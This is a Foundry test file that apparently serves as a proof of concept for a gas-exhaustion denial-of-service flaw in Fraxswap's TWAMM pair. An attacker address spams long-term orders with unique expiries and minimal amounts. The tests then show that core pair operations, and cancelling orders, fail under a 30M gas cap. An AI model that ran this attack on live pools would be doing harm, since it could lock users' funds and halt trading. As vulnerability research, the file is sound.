// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "../contracts/core/FraxswapFactory.sol";
import "../contracts/core/FraxswapPair.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract TwammGasGrowthPoC is Test {
    FraxswapFactory factory;
    FraxswapPair pair;
    MockERC20 token0;
    MockERC20 token1;

    address attacker = address(0xA11CE);

    function setUp() public {
        factory = new FraxswapFactory(address(this));

        token0 = new MockERC20("Token0", "TK0");
        token1 = new MockERC20("Token1", "TK1");

        address pairAddr = factory.createPair(address(token0), address(token1));
        pair = FraxswapPair(pairAddr);

        token0.mint(address(this), 1_000_000_000 ether);
        token1.mint(address(this), 1_000_000_000 ether);

        token0.approve(address(pair), type(uint256).max);
        token1.approve(address(pair), type(uint256).max);

        token0.transfer(address(pair), 100_000_000 ether);
        token1.transfer(address(pair), 100_000_000 ether);
        pair.mint(address(this));

        token0.mint(attacker, 1_000_000_000 ether);
        token1.mint(attacker, 1_000_000_000 ether);

        vm.startPrank(attacker);
        token0.approve(address(pair), type(uint256).max);
        token1.approve(address(pair), type(uint256).max);
        vm.stopPrank();
    }

    function _createUniqueExpiryOrders(uint256 n) internal {
        vm.startPrank(attacker);
        for (uint256 i = 1; i <= n; i++) {
            pair.longTermSwapFrom0To1(10 ether, i);
        }
        vm.stopPrank();
    }

    function _measureExecuteGas() internal returns (uint256 gasUsed) {
        uint256 beforeGas = gasleft();
        pair.executeVirtualOrders(block.timestamp);
        gasUsed = beforeGas - gasleft();
    }

    function test_Diagnostic_TWAMM_executeGasGrowth_uniqueExpiries() public {
        uint256[6] memory counts = [uint256(1), 5, 10, 25, 50, 100];

        for (uint256 c = 0; c < counts.length; c++) {
            uint256 snap = vm.snapshot();

            uint256 n = counts[c];
            _createUniqueExpiryOrders(n);

            vm.warp(block.timestamp + (n + 2) * 3600);

            uint256 gasUsed = _measureExecuteGas();

            emit log_named_uint("uniqueExpiryOrders", n);
            emit log_named_uint("executeVirtualOrdersGas", gasUsed);
            emit log_string("---");

            vm.revertTo(snap);
        }
    }

    function test_Diagnostic_TWAMM_syncGasAfterUniqueExpirySpam() public {
        uint256 n = 100;
        _createUniqueExpiryOrders(n);

        vm.warp(block.timestamp + (n + 2) * 3600);

        uint256 beforeGas = gasleft();
        pair.sync();
        uint256 gasUsed = beforeGas - gasleft();

        emit log_named_uint("uniqueExpiryOrders", n);
        emit log_named_uint("syncGas", gasUsed);
    }

    function test_Diagnostic_TWAMM_executeGasGrowth_largeScale() public {
        uint256[4] memory counts = [uint256(250), 500, 750, 1000];

        for (uint256 c = 0; c < counts.length; c++) {
            uint256 snap = vm.snapshot();

            uint256 n = counts[c];
            _createUniqueExpiryOrders(n);

            vm.warp(block.timestamp + (n + 2) * 3600);

            uint256 beforeGas = gasleft();
            bool ok;
            try pair.executeVirtualOrders(block.timestamp) {
                ok = true;
            } catch {
                ok = false;
            }
            uint256 gasUsed = beforeGas - gasleft();

            emit log_named_uint("uniqueExpiryOrders", n);
            emit log_named_uint("executeOk", ok ? 1 : 0);
            emit log_named_uint("executeVirtualOrdersGasOrFailedGas", gasUsed);
            emit log_string("---");

            vm.revertTo(snap);
        }
    }
    function test_POC_TWAMM_syncFailsUnderThirtyMillionGasAfterExpirySpam() public {
        uint256 n = 1000;
        _createUniqueExpiryOrders(n);

        vm.warp(block.timestamp + (n + 2) * 3600);

        uint256 beforeGas = gasleft();
        bool ok;
        try pair.sync{gas: 30_000_000}() {
            ok = true;
        } catch {
            ok = false;
        }
        uint256 gasUsed = beforeGas - gasleft();

        emit log_named_uint("uniqueExpiryOrders", n);
        emit log_named_uint("syncUnder30mGasOk", ok ? 1 : 0);
        emit log_named_uint("outerGasUsed", gasUsed);

        assertFalse(ok, "sync unexpectedly succeeded under 30M gas");
    }

    function test_Diagnostic_TWAMM_stateClearsAfterSuccessfulExecution() public {
        uint256 n = 1000;
        _createUniqueExpiryOrders(n);

        vm.warp(block.timestamp + (n + 2) * 3600);

        uint256 beforeGasA = gasleft();
        pair.executeVirtualOrders(block.timestamp);
        uint256 gasA = beforeGasA - gasleft();

        uint256 beforeGasB = gasleft();
        pair.sync();
        uint256 gasB = beforeGasB - gasleft();

        emit log_named_uint("firstExecuteGas", gasA);
        emit log_named_uint("secondSyncGasAfterCatchup", gasB);
    }

    function test_Diagnostic_TWAMM_attackerSetupGasCost_1000UniqueExpiries() public {
        uint256 n = 1000;

        uint256 beforeGas = gasleft();
        _createUniqueExpiryOrders(n);
        uint256 setupGas = beforeGas - gasleft();

        emit log_named_uint("uniqueExpiryOrders", n);
        emit log_named_uint("attackerSetupGas", setupGas);
        emit log_named_uint("avgGasPerOrder", setupGas / n);
    }

    function _minAmountForIntervals(uint256 intervals) internal view returns (uint256) {
        uint256 currentTime = block.timestamp;
        uint256 lastExpiryTimestamp = currentTime - (currentTime % 3600);
        uint256 orderExpiry = 3600 * (intervals + 1) + lastExpiryTimestamp;
        uint256 duration = orderExpiry - currentTime;

        // sellingRate = (1_000_000 * amount) / duration
        // Need sellingRate > 0, so amount >= floor(duration / 1_000_000) + 1
        return (duration / 1_000_000) + 1;
    }

    function _createUniqueExpiryOrdersMinAmount(uint256 n) internal returns (uint256 totalTokenIn) {
        vm.startPrank(attacker);
        for (uint256 i = 1; i <= n; i++) {
            uint256 amount = _minAmountForIntervals(i);
            totalTokenIn += amount;
            pair.longTermSwapFrom0To1(amount, i);
        }
        vm.stopPrank();
    }

    function test_Diagnostic_TWAMM_minAmountExpirySpam_1000() public {
        uint256 n = 1000;

        uint256 beforeGas = gasleft();
        uint256 totalTokenIn = _createUniqueExpiryOrdersMinAmount(n);
        uint256 setupGas = beforeGas - gasleft();

        vm.warp(block.timestamp + (n + 2) * 3600);

        uint256 beforeExecGas = gasleft();
        bool ok;
        try pair.sync{gas: 30_000_000}() {
            ok = true;
        } catch {
            ok = false;
        }
        uint256 failedSyncGas = beforeExecGas - gasleft();

        emit log_named_uint("uniqueExpiryOrders", n);
        emit log_named_uint("totalTokenInMinAmount", totalTokenIn);
        emit log_named_uint("attackerSetupGas", setupGas);
        emit log_named_uint("avgGasPerOrder", setupGas / n);
        emit log_named_uint("syncUnder30mGasOk", ok ? 1 : 0);
        emit log_named_uint("failedSyncGas", failedSyncGas);
    }

    function _setupMinAmountExpirySpam(uint256 n) internal {
        _createUniqueExpiryOrdersMinAmount(n);
        vm.warp(block.timestamp + (n + 2) * 3600);
    }

    function test_POC_TWAMM_corePairOpsFailUnder30MAfterMinAmountExpirySpam() public {
        uint256 n = 1000;
        _setupMinAmountExpirySpam(n);

        bool syncOk;
        try pair.sync{gas: 30_000_000}() {
            syncOk = true;
        } catch {
            syncOk = false;
        }

        bool skimOk;
        try pair.skim{gas: 30_000_000}(address(this)) {
            skimOk = true;
        } catch {
            skimOk = false;
        }

        // Prepare a normal swap input before trying swap.
        token0.transfer(address(pair), 1 ether);

        bool swapOk;
        try pair.swap{gas: 30_000_000}(0, 1, address(this), "") {
            swapOk = true;
        } catch {
            swapOk = false;
        }

        emit log_named_uint("uniqueExpiryOrders", n);
        emit log_named_uint("syncUnder30mOk", syncOk ? 1 : 0);
        emit log_named_uint("skimUnder30mOk", skimOk ? 1 : 0);
        emit log_named_uint("swapUnder30mOk", swapOk ? 1 : 0);

        assertFalse(syncOk, "sync unexpectedly succeeded under 30M gas");
        assertFalse(skimOk, "skim unexpectedly succeeded under 30M gas");
        assertFalse(swapOk, "swap unexpectedly succeeded under 30M gas");
    }

    function test_POC_TWAMM_allCoreOpsFailUnder30MAfterMinAmountExpirySpam() public {
        uint256 n = 1000;
        _setupMinAmountExpirySpam(n);

        bool syncOk;
        try pair.sync{gas: 30_000_000}() { syncOk = true; } catch { syncOk = false; }

        bool skimOk;
        try pair.skim{gas: 30_000_000}(address(this)) { skimOk = true; } catch { skimOk = false; }

        token0.transfer(address(pair), 1 ether);
        bool swapOk;
        try pair.swap{gas: 30_000_000}(0, 1, address(this), "") { swapOk = true; } catch { swapOk = false; }

        token0.transfer(address(pair), 1 ether);
        token1.transfer(address(pair), 1 ether);
        bool mintOk;
        try pair.mint{gas: 30_000_000}(address(this)) { mintOk = true; } catch { mintOk = false; }

        bool burnOk;
        try pair.burn{gas: 30_000_000}(address(this)) { burnOk = true; } catch { burnOk = false; }

        emit log_named_uint("uniqueExpiryOrders", n);
        emit log_named_uint("syncUnder30mOk", syncOk ? 1 : 0);
        emit log_named_uint("skimUnder30mOk", skimOk ? 1 : 0);
        emit log_named_uint("swapUnder30mOk", swapOk ? 1 : 0);
        emit log_named_uint("mintUnder30mOk", mintOk ? 1 : 0);
        emit log_named_uint("burnUnder30mOk", burnOk ? 1 : 0);

        assertFalse(syncOk, "sync unexpectedly succeeded under 30M gas");
        assertFalse(skimOk, "skim unexpectedly succeeded under 30M gas");
        assertFalse(swapOk, "swap unexpectedly succeeded under 30M gas");
        assertFalse(mintOk, "mint unexpectedly succeeded under 30M gas");
        assertFalse(burnOk, "burn unexpectedly succeeded under 30M gas");
    }

    function test_POC_TWAMM_expirySpamRepeatableAcrossThreeCycles() public {
        uint256 n = 1000;

        for (uint256 cycle = 1; cycle <= 3; cycle++) {
            _createUniqueExpiryOrdersMinAmount(n);
            vm.warp(block.timestamp + (n + 2) * 3600);

            bool syncOk;
            try pair.sync{gas: 30_000_000}() { syncOk = true; } catch { syncOk = false; }

            emit log_named_uint("cycle", cycle);
            emit log_named_uint("syncUnder30mOkBeforeCatchup", syncOk ? 1 : 0);

            uint256 beforeGas = gasleft();
            pair.executeVirtualOrders(block.timestamp);
            uint256 catchupGas = beforeGas - gasleft();

            emit log_named_uint("catchupGas", catchupGas);

            uint256 beforeGas2 = gasleft();
            pair.sync();
            uint256 postClearSyncGas = beforeGas2 - gasleft();

            emit log_named_uint("postClearSyncGas", postClearSyncGas);
            emit log_string("---");

            assertFalse(syncOk, "sync unexpectedly succeeded under 30M gas before catchup");
            assertLt(postClearSyncGas, 100_000, "state did not clear after catchup");
        }
    }

    function _trySyncWithGas(uint256 gasCap) internal returns (bool ok) {
        try pair.sync{gas: gasCap}() { ok = true; } catch { ok = false; }
    }

    function test_Diagnostic_TWAMM_breakingThresholds_30m60m110m() public {
        uint256[7] memory counts = [uint256(700), 800, 900, 1000, 1500, 2000, 3000];

        for (uint256 i = 0; i < counts.length; i++) {
            uint256 snap = vm.snapshot();

            uint256 n = counts[i];
            uint256 tokenIn = _createUniqueExpiryOrdersMinAmount(n);
            vm.warp(block.timestamp + (n + 2) * 3600);

            bool ok30 = _trySyncWithGas(30_000_000);
            bool ok60 = _trySyncWithGas(60_000_000);
            bool ok110 = _trySyncWithGas(110_000_000);

            emit log_named_uint("uniqueExpiryOrders", n);
            emit log_named_uint("totalTokenIn", tokenIn);
            emit log_named_uint("sync30mOk", ok30 ? 1 : 0);
            emit log_named_uint("sync60mOk", ok60 ? 1 : 0);
            emit log_named_uint("sync110mOk", ok110 ? 1 : 0);
            emit log_string("---");

            vm.revertTo(snap);
        }
    }

    function test_Diagnostic_TWAMM_singleThreshold_1500_60m() public {
        uint256 n = 1500;
        uint256 tokenIn = _createUniqueExpiryOrdersMinAmount(n);
        vm.warp(block.timestamp + (n + 2) * 3600);

        bool ok60;
        try pair.sync{gas: 60_000_000}() { ok60 = true; } catch { ok60 = false; }

        emit log_named_uint("uniqueExpiryOrders", n);
        emit log_named_uint("totalTokenIn", tokenIn);
        emit log_named_uint("sync60mOk", ok60 ? 1 : 0);
    }

    function test_Diagnostic_TWAMM_singleThreshold_1600_60m() public {
        uint256 n = 1600;
        uint256 tokenIn = _createUniqueExpiryOrdersMinAmount(n);
        vm.warp(block.timestamp + (n + 2) * 3600);

        bool ok60;
        try pair.sync{gas: 60_000_000}() { ok60 = true; } catch { ok60 = false; }

        emit log_named_uint("uniqueExpiryOrders", n);
        emit log_named_uint("totalTokenIn", tokenIn);
        emit log_named_uint("sync60mOk", ok60 ? 1 : 0);
    }

    function test_Diagnostic_TWAMM_singleThreshold_3000_110m() public {
        uint256 n = 3000;
        uint256 tokenIn = _createUniqueExpiryOrdersMinAmount(n);
        vm.warp(block.timestamp + (n + 2) * 3600);

        bool ok110;
        try pair.sync{gas: 110_000_000}() { ok110 = true; } catch { ok110 = false; }

        emit log_named_uint("uniqueExpiryOrders", n);
        emit log_named_uint("totalTokenIn", tokenIn);
        emit log_named_uint("sync110mOk", ok110 ? 1 : 0);
    }

    function _createSameExpiryOrdersMinAmount(uint256 n, uint256 intervals) internal returns (uint256 totalTokenIn) {
        vm.startPrank(attacker);
        for (uint256 i = 0; i < n; i++) {
            uint256 amount = _minAmountForIntervals(intervals);
            totalTokenIn += amount;
            pair.longTermSwapFrom0To1(amount, intervals);
        }
        vm.stopPrank();
    }

    function test_Diagnostic_TWAMM_sameExpiryVsUniqueExpiryGas() public {
        uint256 n = 1000;

        uint256 snap = vm.snapshot();

        uint256 sameTokenIn = _createSameExpiryOrdersMinAmount(n, 1000);
        vm.warp(block.timestamp + (1002 * 3600));

        uint256 beforeSame = gasleft();
        pair.executeVirtualOrders(block.timestamp);
        uint256 sameExpiryGas = beforeSame - gasleft();

        emit log_named_uint("sameExpiryOrders", n);
        emit log_named_uint("sameExpiryTokenIn", sameTokenIn);
        emit log_named_uint("sameExpiryCatchupGas", sameExpiryGas);

        vm.revertTo(snap);

        uint256 uniqueTokenIn = _createUniqueExpiryOrdersMinAmount(n);
        vm.warp(block.timestamp + (1002 * 3600));

        uint256 beforeUnique = gasleft();
        pair.executeVirtualOrders(block.timestamp);
        uint256 uniqueExpiryGas = beforeUnique - gasleft();

        emit log_named_uint("uniqueExpiryOrders", n);
        emit log_named_uint("uniqueExpiryTokenIn", uniqueTokenIn);
        emit log_named_uint("uniqueExpiryCatchupGas", uniqueExpiryGas);

        assertGt(uniqueExpiryGas, sameExpiryGas * 5, "unique expiries should be much more expensive");
    }

    function test_Diagnostic_TWAMM_attackerCanCancelOwnOrdersBeforeExpiry() public {
        vm.startPrank(attacker);
        uint256 amount = 1 ether;
        uint256 orderId = pair.longTermSwapFrom0To1(amount, 10);

        uint256 beforeGas = gasleft();
        pair.cancelLongTermSwap(orderId);
        uint256 cancelGas = beforeGas - gasleft();
        vm.stopPrank();

        emit log_named_uint("cancelOwnOrderBeforeExpiryGas", cancelGas);
    }

    function test_Diagnostic_TWAMM_cancelAlsoFailsUnder30MAfterExpirySpam() public {
        uint256 n = 1000;

        vm.startPrank(attacker);
        uint256 firstOrderId = pair.longTermSwapFrom0To1(_minAmountForIntervals(1), 1);
        for (uint256 i = 2; i <= n; i++) {
            pair.longTermSwapFrom0To1(_minAmountForIntervals(i), i);
        }
        vm.stopPrank();

        vm.warp(block.timestamp + (n + 2) * 3600);

        bool cancelOk;
        vm.startPrank(attacker);
        try pair.cancelLongTermSwap{gas: 30_000_000}(firstOrderId) {
            cancelOk = true;
        } catch {
            cancelOk = false;
        }
        vm.stopPrank();

        emit log_named_uint("uniqueExpiryOrders", n);
        emit log_named_uint("cancelUnder30mOkAfterExpirySpam", cancelOk ? 1 : 0);

        assertFalse(cancelOk, "cancel unexpectedly succeeded under 30M gas after expiry spam");
    }

    function test_Diagnostic_TWAMM_nonOwnerCannotCancelAttackerOrder() public {
        vm.startPrank(attacker);
        uint256 orderId = pair.longTermSwapFrom0To1(_minAmountForIntervals(10), 10);
        vm.stopPrank();

        address nonOwner = address(0xB0B);
        vm.startPrank(nonOwner);
        vm.expectRevert();
        pair.cancelLongTermSwap(orderId);
        vm.stopPrank();
    }

}
